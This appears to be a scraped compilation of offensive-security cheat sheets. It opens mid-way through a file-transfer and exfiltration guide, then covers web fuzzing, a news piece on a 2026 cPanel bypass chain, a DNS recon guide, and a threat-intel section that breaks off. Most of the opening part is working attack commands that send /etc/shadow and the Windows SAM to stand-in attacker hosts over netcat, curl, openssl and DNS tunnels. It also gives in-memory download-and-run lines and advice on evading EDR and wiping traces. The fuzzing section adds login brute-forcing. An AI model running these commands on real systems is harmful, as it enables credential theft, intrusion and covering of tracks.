perl -e 'use lwp::simple; getstore("http://attacker_ip/tool", "/tmp/tool");'

# python (already covered but worth listing)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker_ip/tool','/tmp/tool')"

# ruby
ruby -e "require 'open-uri'; io.copy_stream(uri.open('http://attacker_ip/tool'),'/tmp/tool')"

# awk
awk 'begin { rs="\0"; while (("curl -s http://attacker_ip/tool" | getline line) > 0) print line }' > /tmp/tool

# nc (receive from attacker-side listener)
nc attacker_ip 4444 > /tmp/tool

# tftp (when available)
tftp -i attacker_ip get tool.exe upload with unexpected binaries # curl post
curl -f 'file=@/etc/shadow' http://attacker_ip/upload

# wget post (less common but works)
wget --post-file=/etc/shadow http://attacker_ip/upload

# openssl (encrypted channel)
# attacker: openssl s_server -quiet -port 443 > received_file
openssl s_client -quiet -connect attacker_ip:443 < /etc/shadow

# nc pipe
nc attacker_ip 4444 < /etc/shadow netcat file transfers netcat is the universal transfer mechanism when http isn't available or you want a raw tcp channel. standard (attacker sends, target receives) # attacker (sends file):
nc -lvnp 4444 < tool.exe

# target (receives):
nc attacker_ip 4444 > /tmp/tool reversed (target sends, attacker receives — for exfil) # attacker (receives, must start first):
nc -lvnp 4444 > loot.tar.gz

# target (sends):
tar czf - /home/user | nc attacker_ip 4444 with progress and integrity # attacker sends with pv (progress viewer):
nc -lvnp 4444 < tool.exe &
pv tool.exe | nc attacker_ip 4444  # shows progress on attacker side

# always verify hash after transfer
md5sum tool.exe
md5sum /tmp/tool ncat (nmap's netcat — supports ssl) # attacker:
ncat -lvnp 4444 --ssl < tool.exe

# target:
ncat attacker_ip 4444 --ssl-verify=no > /tmp/tool windows netcat (if available) :: receive:
nc.exe attacker_ip 4444 > c:\temp\tool.exe

:: send:
nc.exe attacker_ip 4444 < c:\windows\repair\sam powershell as netcat replacement (no nc on windows) # receive from attacker:
$c = new-object net.sockets.tcpclient('attacker_ip', 4444)
$s = $c.getstream()
$b = new-object byte[] 65536
$f = [io.file]::openwrite('c:\temp\tool.exe')
do {
    $r = $s.read($b, 0, $b.length)
    $f.write($b, 0, $r)
} while ($r -gt 0)
$f.close(); $c.close() ftp transfers ftp is often available in restricted environments and is less monitored than http in some legacy networks. python ftp server pip3 install pyftpdlib

# anonymous read-only
python3 -m pyftpdlib -p 21

# anonymous write-enabled (for uploads from target)
python3 -m pyftpdlib -p 21 -w

# with specific directory
python3 -m pyftpdlib -p 21 -d /opt/tools

# authenticated
python3 -m pyftpdlib -p 21 -u user -p passw0rd -d /opt/tools linux ftp client ftp attacker_ip
# login: anonymous / [blank]
get tool.exe
put /etc/shadow shadow windows ftp (non-interactive / scripted) :: create script
echo open attacker_ip > ftp.txt
echo anonymous >> ftp.txt
echo anon >> ftp.txt
echo binary >> ftp.txt
echo get tool.exe c:\temp\tool.exe >> ftp.txt
echo bye >> ftp.txt

:: execute
ftp -s:ftp.txt powershell ftp download $ftp = 'ftp://attacker_ip/tool.exe'
$dest = 'c:\temp\tool.exe'
$req = [net.ftpwebrequest]::create($ftp)
$req.method = [net.webrequestmethods+ftp]::downloadfile
$req.credentials = new-object net.networkcredential('anonymous', 'pass')
$resp = $req.getresponse()
$stream = $resp.getresponsestream()
$out = [io.file]::create($dest)
$stream.copyto($out)
$out.close()
$stream.close() dns exfiltration (covert channel) when all tcp/udp is blocked outbound except dns (port 53), you can tunnel data through dns queries. this is slow but bypasses most firewall rules because dns is rarely blocked. dnscat2 provides an encrypted c2 channel over dns: # attacker — server
gem install dnscat2
dnscat2-server --dns domain=attacker.com,host=0.0.0.0

# target — client
./dnscat2 attacker.com
# or
powershell downloadstring('http://attacker/dnscat2.ps1'); start-dnscat2 -domain attacker.com once connected, you get a shell and can upload/download files via the `download` and `upload` commands. manual dns exfil (tiny files) encode data in subdomain queries — each query carries ~60 chars: # target — split file into dns-safe chunks
cat /etc/shadow | base64 | tr -d '\n' | fold -w 60 |
while ifs= read -r chunk; do
  dig $chunk.exfil.attacker.com @attacker_dns_ip
done # attacker — capture on dns server
tcpdump -i eth0 -n port 53 -w dns_exfil.pcap
# extract subdomains, strip .exfil.attacker.com, base64 decode this is low-bandwidth (a few kb/min) and mainly useful for extracting small secrets like password hashes. iodine full ip-over-dns tunnel — lets you run any tcp/udp protocol through dns: # server (needs domain with ns record pointing to your ip)
iodined -f -c -p pass 10.0.0.1 tunnel.attacker.com

# client
iodine -f -p pass tunnel.attacker.com
# gets a tunnel ip like 10.0.0.2 — can now scp/curl through it opsec considerations file transfers are high-visibility. the wrong method trips edr, av, or siem alerts immediately. what defenders see prefer in-memory execution # never writes to disk — av has nothing to scan
iex (new-object net.webclient).downloadstring('http://ip/tool.ps1')

# run from smb share — same principle
\\attacker_ip\share\tool.exe randomise user-agents $wc = new-object net.webclient
$wc.headers.add('user-agent', 'mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36')
$wc.downloadfile('http://ip/tool.exe', 'c:\temp\tool.exe') https everything tls encrypts the content — network inspection can't see what was transferred. self-signed certs work fine unless ssl inspection (mitm proxy) is in place. blend in - drop files to `c:\windows\temp\`, `c:\users\public\`, or `%appdata%` — not desktop or root of c:
- use process names that match legitimate software
- transfer during business hours when traffic volume is highest
- keep transferred files small — large downloads are anomalous clean up :: windows
del c:\windows\temp\tool.exe

:: powershell
remove-item c:\windows\temp\tool.exe -force

:: overwrite before delete (file carving harder)
cipher /w:c:\windows\temp  :: fills free space # linux
rm /tmp/linpeas.sh
shred -u /tmp/tool  # multiple overwrites quick reference cheatsheet linux download wget http://ip/file -o /tmp/file
curl http://ip/file -o /tmp/file
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ip/file','/tmp/file')"
bash -c 'exec 3<>/dev/tcp/ip/80; echo -e "get /file http/1.0\r\n\r\n">&3; cat<&3>/tmp/file' linux upload curl -f 'files=@/etc/shadow' http://ip/upload
nc ip 4444 < /etc/shadow
base64 /etc/shadow   # then copy-paste windows download (new-object net.webclient).downloadfile('http://ip/tool.exe','c:\temp\tool.exe')
iwr http://ip/tool.exe -outfile c:\temp\tool.exe
certutil -urlcache -split -f http://ip/tool.exe c:\temp\tool.exe
curl http://ip/tool.exe -o c:\temp\tool.exe windows upload (new-object net.webclient).uploadfile('http://ip/upload','c:\file')
copy c:\file \\ip\share\
[convert]::tobase64string([io.file]::readallbytes('c:\file'))   # copy-paste smb share (attacker) impacket-smbserver share /opt/tools -smb2support http server (attacker) python3 -m http.server 80
python3 -m uploadserver 80

title: ffuf & Gobuster – Web Fuzzing & Directory Enumeration
summary: ffuf and Gobuster are the go-to tools for discovering hidden directories, subdomains, virtual hosts, and parameters. Learn their flags, filtering tricks, and th
body:
ffuf & gobuster – web fuzzing & directory enumeration ffuf and gobuster are the go-to tools for discovering hidden directories, subdomains, virtual hosts, and parameters. learn their flags, filtering tricks, and the right tool for each job. tools ffuf gobuster fuzzing web enumeration pentesting overview both tools brute-force web targets using wordlists, but have different strengths: wordlists both tools are only as good as the wordlist. key lists from **seclists** (`/usr/share/seclists/`): ffuf – fuzz faster u fool ffuf places the keyword `fuzz` anywhere in a request — url, headers, post body, cookies. this makes it the most flexible of the two. ffuf – directory & file enumeration # basic directory scan
ffuf -u http://target.com/fuzz -w /usr/share/seclists/discovery/web-content/common.txt

# with file extensions
ffuf -u http://target.com/fuzz -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak

# recurse into found directories
ffuf -u http://target.com/fuzz -w wordlist.txt -recursion -recursion-depth 2

# https target
ffuf -u https://target.com/fuzz -w wordlist.txt -k   # -k skips tls verification

# custom headers (e.g. auth token)
ffuf -u http://target.com/fuzz -w wordlist.txt -h 'authorization: bearer eyj...'

# follow redirects
ffuf -u http://target.com/fuzz -w wordlist.txt -r ffuf – output filtering filtering is where ffuf shines — cut through noise without piping to grep. # filter out a status code (e.g. hide all 404s)
ffuf -u http://target.com/fuzz -w wordlist.txt -fc 404

# match only specific status codes
ffuf -u http://target.com/fuzz -w wordlist.txt -mc 200,301,302

# filter by response size (hide responses of exactly 1234 bytes)
ffuf -u http://target.com/fuzz -w wordlist.txt -fs 1234

# filter by word count in response
ffuf -u http://target.com/fuzz -w wordlist.txt -fw 12

# filter by number of lines
ffuf -u http://target.com/fuzz -w wordlist.txt -fl 1

# match by regex in response body
ffuf -u http://target.com/fuzz -w wordlist.txt -mr 'admin|dashboard|panel'

# combine: match 200 and filter size noise
ffuf -u http://target.com/fuzz -w wordlist.txt -mc 200 -fs 0 ffuf – virtual host & subdomain fuzzing # vhost fuzzing (host header injection)
ffuf -u http://192.168.1.10/ -w subdomains.txt \
  -h 'host: fuzz.target.com' -mc 200 -fs 1234

# subdomain fuzzing via dns (resolves names)
ffuf -u http://fuzz.target.com/ -w subdomains.txt -mc 200,301,302

# use top 5000 subdomains list
ffuf -u http://fuzz.target.com/ \
  -w /usr/share/seclists/discovery/dns/subdomains-top1million-5000.txt ffuf – parameter & post body fuzzing # get parameter name fuzzing
ffuf -u 'http://target.com/index.php?fuzz=test' \
  -w /usr/share/seclists/discovery/web-content/burp-parameter-names.txt \
  -mc 200 -fw 10

# get parameter value fuzzing
ffuf -u 'http://target.com/page?id=fuzz' -w /usr/share/wordlists/rockyou.txt

# post body fuzzing (login brute-force)
ffuf -u http://target.com/login -x post \
  -d 'username=admin&password=fuzz' \
  -h 'content-type: application/x-www-form-urlencoded' \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 200 -fr 'invalid password'

# json body fuzzing
ffuf -u http://target.com/api/login -x post \
  -d '{"username":"admin","password":"fuzz"}' \
  -h 'content-type: application/json' \
  -w passwords.txt -mr '"token"' ffuf – multiple wordlists (clusterbomb) # fuzz both username and password simultaneously
ffuf -u http://target.com/login -x post \
  -d 'user=w1&pass=w2' \
  -h 'content-type: application/x-www-form-urlencoded' \
  -w users.txt:w1 -w passwords.txt:w2 \
  -mc 302 ffuf – speed & output flags # set threads (default 40)
ffuf -u http://target.com/fuzz -w wordlist.txt -t 100

# rate limit (requests per second)
ffuf -u http://target.com/fuzz -w wordlist.txt -rate 50

# save results to json
ffuf -u http://target.com/fuzz -w wordlist.txt -o results.json -of json

# save to csv
ffuf -u http://target.com/fuzz -w wordlist.txt -o results.csv -of csv

# silent mode (only results, no banner)
ffuf -u http://target.com/fuzz -w wordlist.txt -s

# timeout per request
ffuf -u http://target.com/fuzz -w wordlist.txt -timeout 5 gobuster gobuster uses distinct **modes**: `dir`, `dns`, `vhost`, `fuzz`, `s3`. it's slightly simpler than ffuf but excellent for quick scans. gobuster – dir mode # basic directory scan
gobuster dir -u http://target.com -w /usr/share/seclists/discovery/web-content/common.txt

# add file extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt,bak

# set threads
gobuster dir -u http://target.com -w wordlist.txt -t 50

# skip tls verification
gobuster dir -u https://target.com -w wordlist.txt -k

# custom status codes to show
gobuster dir -u http://target.com -w wordlist.txt -s 200,204,301,302,403

# hide specific status codes
gobuster dir -u http://target.com -w wordlist.txt -b 404,403

# add cookie for authenticated scans
gobuster dir -u http://target.com -w wordlist.txt \
  -c 'session=abc123; phpsessid=xyz'

# custom headers
gobuster dir -u http://target.com -w wordlist.txt \
  -h 'authorization: bearer token'

# follow redirects + show full urls
gobuster dir -u http://target.com -w wordlist.txt -r -e

# save output
gobuster dir -u http://target.com -w wordlist.txt -o gobuster-results.txt gobuster – dns mode # subdomain enumeration
gobuster dns -d target.com \
  -w /usr/share/seclists/discovery/dns/subdomains-top1million-5000.txt

# show resolved ips
gobuster dns -d target.com -w subdomains.txt -i

# use a specific resolver
gobuster dns -d target.com -w subdomains.txt -r 8.8.8.8

# wildcard detection (auto-detected, but can force)
gobuster dns -d target.com -w subdomains.txt --wildcard gobuster – vhost mode # virtual host enumeration (manipulates host header)
gobuster vhost -u http://192.168.1.10 \
  -w /usr/share/seclists/discovery/dns/subdomains-top1million-5000.txt

# append domain to each word
gobuster vhost -u http://192.168.1.10 -w subdomains.txt \
  --append-domain -d target.com

# filter by response size to remove noise
gobuster vhost -u http://192.168.1.10 -w subdomains.txt --exclude-length 301 real-world use cases **bug bounty / web application testing**
- discover admin panels (`/admin`, `/administrator`, `/wp-admin`, `/phpmyadmin`) that shouldn't be public
- find backup files and exposed configs: `.bak`, `.old`, `.env`, `config.php.bak`
- enumerate api endpoints on `/api/v1/fuzz` to map undocumented routes
- discover staging and dev subdomains (`dev.`, `staging.`, `test.`) that may have weaker security **penetration testing**
- map the full attack surface of a web app before manual testing
- find forgotten upload directories, log files, or database exports left on the server
- fuzz get/post parameters to discover hidden functionality (idor, sqli, ssrf entry points)
- after gaining credentials, fuzz authenticated endpoints with a session cookie ctf / htb workflow # step 1: fast first pass with small list
gobuster dir -u http://<target> -w /usr/share/seclists/discovery/web-content/common.txt -t 50

# step 2: deeper scan with extensions on found paths
ffuf -u http://<target>/fuzz -w /usr/share/seclists/discovery/web-content/directory-list-2.3-medium.txt \
  -e .php,.txt,.html,.bak,.zip -mc 200,301,302,403 -t 80

# step 3: check for vhosts (common on htb)
ffuf -u http://<target>/ -h 'host: fuzz.<domain>' \
  -w /usr/share/seclists/discovery/dns/subdomains-top1million-5000.txt \
  -mc 200 -fs <default_size>

# step 4: add found vhost to /etc/hosts then re-scan
echo '<ip> <vhost>' | sudo tee -a /etc/hosts
ffuf -u http://<vhost>/fuzz -w wordlist.txt -mc 200,301,302

# step 5: fuzz parameters on interesting pages
ffuf -u 'http://<target>/page.php?fuzz=1' \
  -w /usr/share/seclists/discovery/web-content/burp-parameter-names.txt \
  -mc 200 -fw <baseline_words> - always check `-fs` (filter size) after a first run — 99% of noise is a repeated response size
- `/api/v1/fuzz` and `/api/v2/fuzz` are worth dedicated wordlist passes on api challenges
- found a 403? try adding a trailing slash, `..;/`, or `%2e%2e/` — 403 bypass is a common ctf path
- `.git/`, `.env`, `backup.zip`, `config.bak` in wordlists catch more ctf flags than directory names
- htb: vhost fuzzing finds a second app 70% of the time — always check quick reference - `-u` url with `fuzz` keyword
- `-w` wordlist (use `-w list:keyword` for multi-wordlist)
- `-e` extensions (`.php,.html`)
- `-mc` match status codes | `-fc` filter status codes
- `-fs` filter size | `-fw` filter words | `-fl` filter lines
- `-mr` match regex | `-fr` filter regex
- `-t` threads | `-rate` req/sec | `-timeout` seconds
- `-h` header | `-b` cookie | `-x` http method
- `-o` output file | `-of` format (json, csv, html)

**gobuster key flags:**
- `dir` / `dns` / `vhost` — mode
- `-u` url | `-d` domain | `-w` wordlist
- `-x` extensions | `-t` threads
- `-b` blacklist codes | `-s` whitelist codes
- `-k` skip tls | `-r` follow redirects
- `-c` cookie | `-h` header | `-o` output

title: The Edge Is the New Endpoint — Cisco SD-WAN, cPanel, and the EDR Vacuum
summary: Microsoft had a historically quiet May 2026 for zero-days. Edge devices didn't: a Cisco Catalyst SD-WAN Controller flaw and a chained cPanel & WHM authenticatio
body:
the edge is the new endpoint — cisco sd-wan, cpanel, and the edr vacuum microsoft had a historically quiet may 2026 for zero-days. edge devices didn't: a cisco catalyst sd-wan controller flaw and a chained cpanel & whm authentication bypass gave attackers root on infrastructure that simply doesn't run edr. two months of active, undetected exploitation before a patch existed. news edge-devices cve cpanel cisco perimeter persistence may 2026 was unusually quiet for microsoft — zero actively exploited zero-days, a rare month. that quiet didn't extend to the rest of the perimeter. while endpoint security matured, attackers simply moved one layer out, to the devices that sit in front of the endpoint and rarely run anything resembling edr: edge appliances, sd-wan controllers, and hosting control panels.

two disclosures defined the month. **cve-2026-20182** in the cisco catalyst sd-wan controller, and **cve-2026-41940** in cpanel & whm — the latter chained from a minor-looking input validation bug into a full, unauthenticated, zero-day-grade compromise that ran in the wild for over two months before a fix shipped. the cpanel chain: crlf injection to full bypass cve-2026-41940 is the more instructive of the two because of how unremarkable each individual step looks in isolation. attackers combined a **carriage return line feed (crlf) injection** (`%0d%0a`) inside an unvalidated http parameter with a malformed cookie value, manipulating the backend web engine into treating injected header content as a fresh, authenticated session context. neither step is a memory-corruption exploit or a novel technique — it's a parsing inconsistency between two layers of the request-handling stack, chained until it produces a complete authentication bypass.

once inside, attackers reach for the administrative functionality cpanel already exposes by design: backup scripts, diagnostic tooling, and cron management — interfaces built to run arbitrary system commands as root, because that's what a hosting control panel is *for*. the attacker doesn't need a second rce primitive. the panel itself is the rce primitive, once authentication no longer gates it. chain summary — cve-2026-41940 (illustrative, not exploit code):

1. inject crlf sequence (%0d%0a) into an unvalidated request parameter
2. pair with a malformed/crafted cookie value
3. backend incorrectly treats injected header as a valid authenticated session
4. authentication check is bypassed entirely — no credentials required
5. authenticated-only admin functions (backup/diagnostic/cron tooling)
   become reachable, each one a documented path to os command execution rapid7 and cisa's kev catalogue documented active exploitation of cve-2026-41940 for over two months before a patch was available — attackers using it to deploy ransomware and backdoors directly through hosting infrastructure, not through any endpoint at all. cisco catalyst sd-wan: management plane exposure cve-2026-20182 hit the cisco catalyst sd-wan controller — the centralized management plane for an entire wan fabric. a flaw here doesn't compromise one branch office; it compromises the system that configures every branch office's routing and policy simultaneously. rapid7's tracking placed it alongside the cpanel flaw as one of the two standout edge-device disclosures of the period, consistent with a broader pattern: sd-wan controllers, vpn concentrators, and firewall management planes are increasingly the highest-leverage single target on a network, precisely because compromising one yields control over many. the edr vacuum, and why it's structural edge appliances and hosting control panels typically run minimized, purpose-built linux distributions or proprietary firmware — environments that were never designed to host a third-party edr agent, and frequently can't. that isn't a temporary gap that vendors will close; it's a structural property of what these devices are. it makes them a premier choice for long-term, low-noise persistence:

**web shell persistence** — minimal, heavily obfuscated backdoors dropped directly into standard administration dashboards, blending into thousands of legitimate-looking files.

**firmware backdooring** — modifying startup initialization scripts so a network listener re-establishes itself on every reboot, surviving routine maintenance that would kill a typical endpoint implant. remediation matrix edge devices and hosting panels are some of the highest-value, lowest-detection-risk footholds available in a modern engagement. a shell on a cpanel instance or an sd-wan controller frequently survives an entire engagement window without tripping a single edr alert, because there is no edr to trip. if in scope, prioritize identifying internet-exposed management interfaces early — the persistence story alone is usually worth the finding.

sources: rapid7 and cisa kev, may–june 2026 tracking of active exploitation campaigns against cisco catalyst sd-wan controller (cve-2026-20182) and cpanel & whm (cve-2026-41940).

title: DNS — Field Guide
summary: dig, zone transfers, subdomain brute-force, reverse lookups, vhost fuzzing, and a CTF workflow from port scan to /etc/hosts entries.
body:
dns — field guide dig, zone transfers, subdomain brute-force, reverse lookups, vhost fuzzing, and a ctf workflow from port scan to /etc/hosts entries. tools dns recon enumeration tools network what is dns dns (*domain name system*) translates domain names into ip addresses — the phone book of the internet. it runs on **udp port 53** (and tcp 53 for zone transfers and large responses).

for attackers, dns is a recon goldmine. it exposes subdomains, internal hostnames, mail servers, ip ranges, and sometimes even internal network structure. misconfigured dns can leak the entire zone file in a single query.

**record types you'll encounter:** dig `dig` (*domain information groper*) is the standard dns query tool. more verbose and scriptable than `nslookup`, with full control over query type, nameserver, and output format. # basic a record lookup
dig example.com

# query a specific record type
dig example.com a
dig example.com mx
dig example.com ns
dig example.com txt
dig example.com soa
dig example.com aaaa

# query a specific nameserver
dig @8.8.8.8 example.com
dig @10.10.10.5 example.com

# short output (just the answer)
dig +short example.com
dig +short example.com mx

# reverse lookup (ip → hostname)
dig -x 10.10.10.5
dig -x 8.8.8.8 +short

# trace the full resolution path from root
dig +trace example.com

# zone transfer attempt
dig @ns1.example.com example.com axfr

# all records at once
dig example.com any

# suppress extra output — just the answer section
dig +noall +answer example.com nslookup & host `nslookup` is available on windows and linux — useful when `dig` isn't installed. `host` is a simpler one-liner alternative. # nslookup — basic query
nslookup example.com
nslookup example.com 8.8.8.8    # use specific resolver

# nslookup interactive mode
nslookup
> server 10.10.10.5             # set nameserver
> set type=mx
> example.com
> set type=axfr                 # attempt zone transfer
> example.com

# host — simple and clean
host example.com
host -t mx example.com
host -t ns example.com
host -t axfr example.com ns1.example.com   # zone transfer
host 10.10.10.5                            # reverse lookup zone transfers (axfr) a zone transfer (`axfr`) is meant to sync dns data between primary and secondary nameservers. if misconfigured to allow transfers from any ip, it dumps **every dns record in the zone** — subdomains, internal ips, mail servers, everything.

this is one of the highest-value misconfigurations in dns recon. # find the authoritative nameservers first
dig ns example.com +short

# attempt axfr against each nameserver
dig @ns1.example.com example.com axfr
dig @ns2.example.com example.com axfr

# with host
host -l example.com ns1.example.com

# with nmap
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com ns1.example.com

# automated — try all ns records
for ns in $(dig ns example.com +short); do
  echo "--- trying $ns ---"
  dig @$ns example.com axfr
done zone transfers succeed on ctf/htb boxes far more often than in the real world. **always try axfr** once you identify the domain and nameservers. add discovered hostnames to `/etc/hosts` to access them via the web server. subdomain enumeration when zone transfers are blocked, brute-force enumeration is the next step. these tools query a nameserver with wordlists to discover valid subdomains. # basic subdomain brute-force
gobuster dns -d example.com -w /usr/share/wordlists/seclists/discovery/dns/subdomains-top1million-5000.txt

# with a custom resolver (useful for internal dns on ctf boxes)
gobuster dns -d example.com -r 10.10.10.5:53 \
  -w /usr/share/wordlists/seclists/discovery/dns/subdomains-top1million-5000.txt

# show ips in output
gobuster dns -d example.com -w wordlist.txt --show-ips

# increase threads for speed
gobuster dns -d example.com -w wordlist.txt -t 50 # subdomain fuzzing via host header (vhost enumeration)
ffuf -w /usr/share/wordlists/seclists/discovery/dns/subdomains-top1million-5000.txt \
  -u http://10.10.10.5 -h 'host: fuzz.example.com' -fc 302,404

# filter by response size to cut noise
ffuf -w wordlist.txt -u http://10.10.10.5 \
  -h 'host: fuzz.example.com' -fs 1234

# with https
ffuf -w wordlist.txt -u https://10.10.10.5 \
  -h 'host: fuzz.example.com' -k -fc 302,404 # install
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# resolve a list of subdomains
cat subdomains.txt | dnsx -silent

# brute-force with a wordlist
dnsx -d example.com -w wordlist.txt -silent

# show a records
dnsx -d example.com -w wordlist.txt -a -resp

# reverse lookup a cidr
dnsx -ptr -l cidr.txt -resp-only # passive enumeration (no direct dns queries — uses public sources)
amass enum -passive -d example.com

# active enumeration (brute-force + passive)
amass enum -active -d example.com -w wordlist.txt

# save results
amass enum -passive -d example.com -o subdomains.txt

# multiple domains
amass enum -passive -df domains.txt -o results.txt reverse dns & ptr records reverse lookups map ips back to hostnames. walking a target's ip range with reverse lookups often reveals internal hostnames, server names, and infrastructure patterns. # single reverse lookup
dig -x 10.10.10.5 +short
host 10.10.10.5

# sweep a /24 range
for i in $(seq 1 254); do
  host 10.10.10.$i 2>/dev/null | grep 'domain name' | awk '{print $4, "-> 10.10.10.'$i'"}'
done

# with nmap
nmap -sn -r --dns-servers 10.10.10.5 10.10.10.0/24

# with dnsx
echo '10.10.10.0/24' | dnsx -ptr -resp-only -silent real-world use cases **reconnaissance before a pentest engagement** — map the attack surface passively: domain=target.com

# 1. enumerate nameservers
dig ns $domain +short

# 2. grab all top-level records
dig $domain any +noall +answer
dig mx $domain +short
dig txt $domain +short    # spf, dkim, verification tokens

# 3. try zone transfer on each ns
for ns in $(dig ns $domain +short); do
  dig @$ns $domain axfr 2>/dev/null | grep -v '^;'
done

# 4. subdomain brute-force
gobuster dns -d $domain -w /opt/seclists/discovery/dns/subdomains-top1million-20000.txt -t 50

# 5. reverse-sweep known ip ranges
for ip in $(dig $domain +short); do
  nmap -sn -r $ip/24 --dns-servers 8.8.8.8 2>/dev/null | grep 'report for'
done **verify dns propagation** after changing records (real-world sysadmin): # check from multiple resolvers
for resolver in 8.8.8.8 1.1.1.1 9.9.9.9 208.67.222.222; do
  echo -n "$resolver: "
  dig @$resolver example.com a +short
done

# check ttl — how long until the old record expires
dig example.com a | grep -i ttl

# verify spf record is correct
dig txt example.com +short | grep spf

# check dmarc
dig txt _dmarc.example.com +short ctf & hackthebox workflow dns is often the first step on htb boxes. the pattern is almost always the same: find the domain, attempt a zone transfer, discover internal hostnames, add them to `/etc/hosts`, and access new services. export ip=10.10.10.5

# 1. scan port 53 (tcp + udp)
nmap -p 53 -su -st $ip

# 2. find the domain name — check http headers, tls cert, nmap scripts
curl -si http://$ip | grep -i 'location\|host\|server'
nmap -p 443 --script ssl-cert $ip | grep 'subject\|dns'

# 3. attempt zone transfer once you know the domain
dig @$ip example.htb axfr

# 4. add discovered hostnames to /etc/hosts
echo '10.10.10.5  example.htb dev.example.htb admin.example.htb' | sudo tee -a /etc/hosts

# 5. fuzz for vhosts the zone transfer didn't reveal
ffuf -w /opt/seclists/discovery/dns/subdomains-top1million-5000.txt \
  -u http://$ip -h 'host: fuzz.example.htb' -fc 302,400 -fs $(curl -s http://$ip | wc -c)

# 6. enumerate the dns server itself
nmap -p 53 --script dns-recursion,dns-cache-snoop,dns-service-discovery $ip # check for wildcard dns (catches all non-existent subdomains)
dig randomstring123.example.htb @$ip +short
# if this returns an ip, wildcards are enabled — filter your ffuf results

# find the default/wildcard response size to filter with ffuf
curl -s -o /dev/null -w '%{size_download}' -h 'host: random123.example.htb' http://$ip

# then use -fs <that size> in ffuf to skip wildcard matches
ffuf -w wordlist.txt -u http://$ip -h 'host: fuzz.example.htb' -fs 1234 # ad uses dns srv records to advertise services
# find the domain controller
dig _ldap._tcp.dc._msdcs.example.htb srv @$ip
dig _kerberos._tcp.example.htb srv @$ip

# list all ad-related srv records
nmap -p 53 --script dns-srv-enum --script-args 'dns-srv-enum.domain=example.htb' $ip

# with enum4linux-ng (also pulls dns/domain info over ldap/rpc)
enum4linux-ng -a $ip **`dig @<server> <domain> axfr`** — always try zone transfer once you know the domain.  
**`dig +short`** strips noise and gives you just the answer.  
**`dig +trace`** walks you from root to the authoritative ns — great for debugging.  
**add hostnames to `/etc/hosts`** after zone transfers — many htb services only respond to the hostname.  
**wildcard dns breaks subdomain brute-force** — detect it first with a random query, then filter with `-fs`.  
**txt records** often leak internal info: spf includes, verification codes, service metadata.

title: Databases — The Complete Foundation
summary: Relational and NoSQL database fundamentals, SQL from scratch, MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB, Redis, and Cassandra — with red team perspectiv

title: CTI & IoCs – Threat Intelligence from Raw Data to Actionable Detections
summary: Cyber Threat Intelligence turns noise into signal. Learn the intelligence pyramid, what IoCs actually are and how long they last, which feeds to trust, how to q
body:
cti & iocs – threat intelligence from raw data to actionable detections cyber threat intelligence turns noise into signal. learn the intelligence pyramid, what iocs actually are and how long they last, which feeds to trust, how to query them programmatically, and how to hunt for compromise in your own environment. learn cti ioc threat-intel dfir detection threat-hunting what is cti? **cyber threat intelligence (cti)** converts raw threat data into **actionable context**: who is attacking, how, with what tools, and why. without that context, a list of ip addresses is noise. with it, the same list tells you whether you were scanned by opportunistic botnets or targeted by a nation-state actor.

cti is consumed at four levels — each with different producers, consumers, and shelf lives: defenders tend to over-index on the **technical layer** (ioc blocking) because it's the most automated. the problem: attackers rotate ips and domains in minutes. **ttp-level detection ages far better.** iocs – indicators of compromise an **indicator of compromise** is an observable artefact that, with reasonable confidence, indicates a system has been involved in an attack. iocs are evidence, not proof — they need context. **the pyramid of pain** (david bianco, 2013) ranks ioc types by how much pain they cause the attacker when you detect and block them:

`hash values` → `ip addresses` → `domain names` → `network artifacts` → `host artifacts` → **`ttps`** ← hardest for attacker to change

blocking a hash is trivial for an attacker to bypass (recompile). detecting their ttp (e.g. living-off-the-land with certutil for payload staging) forces a full technique change — far more expensive. cti feeds & sources **free / open feeds** **commercial / premium feeds** querying feeds – practical commands # --- cisa kev: pull and search locally ---
curl -s 'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json' \
  -o /tmp/kev.json

# count total entries
python3 -c "import json; d=json.load(open('/tmp/kev.json')); print(len(d['vulnerabilities']), 'entries')"

# find recent additions (2026)
python3 -c "
import json
d = json.load(open('/tmp/kev.json'))
for v in d['vulnerabilities']:
    if '2026' in v.get('dateadded',''):
        print(v['dateadded'], v['cveid'], v['vendorproject'], '-', v['product'])
" | sort -r | head -20

# search by vendor
python3 -c "
import json, sys
vendor = sys.argv[1]
d = json.load(open('/tmp/kev.json'))
for v in d['vulnerabilities']:
    if vendor.lower() in v.get('vendorproject','').lower():
        print(v['cveid'], v['product'], v['dateadded'])
" microsoft # --- virustotal: hash / ip / domain lookup ---
vt_key='<your_vt_api_key>'

# check a file hash
curl -s --request get \
  --url "https://www.virustotal.com/api/v3/files/<sha256>" \
  --header "x-apikey: $vt_key" \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)['data']['attributes']
stats=d['last_analysis_stats']
print(f"malicious: {stats['malicious']} / suspicious: {stats['suspicious']} / undetected: {stats['undetected']}")
print('names:', d.get('meaningful_name',''))
"

# check an ip
curl -s "https://www.virustotal.com/api/v3/ip_addresses/<ip>" \
  --header "x-apikey: $vt_key" | python3 -m json.tool | grep -e 'malicious|country|asn'

# check a domain
curl -s "https://www.virustotal.com/api/v3/domains/<domain>" \
  --header "x-apikey: $vt_key" | python3 -m json.tool | grep -e 'malicious|registrar|creation' # --- abuse.ch feeds ---

# threatfox: search ioc
curl -s 'https://threatfox-api.abuse.ch/api/v1/' \
  --data '{"query": "search_ioc", "search_term": "<ip-or-domain>"}' \
  | python3 -m json.tool

# malwarebazaar: lookup by hash
curl -s 'https://mb-api.abuse.ch/api/v1/' \
  --data 'query=get_info&hash=<sha256>' | python3 -m json.tool

# malwarebazaar: download recent samples list
curl -s 'https://mb-api.abuse.ch/api/v1/' \
  --data 'query=get_recent&selector=time' \
  | python3 -c "
import json,sys
for s in json.load(sys.stdin).get('data',[])[:10]:
    print(s['sha256_hash'], s['file_type'], s['signature'] or 'unknown')
"

# feodo: pull c2 ip blocklist
curl -s 'https://feodotracker.abuse.ch/downloads/ipblocklist.txt' \
  | grep -v '^#' | head -20

# urlhaus: check a url
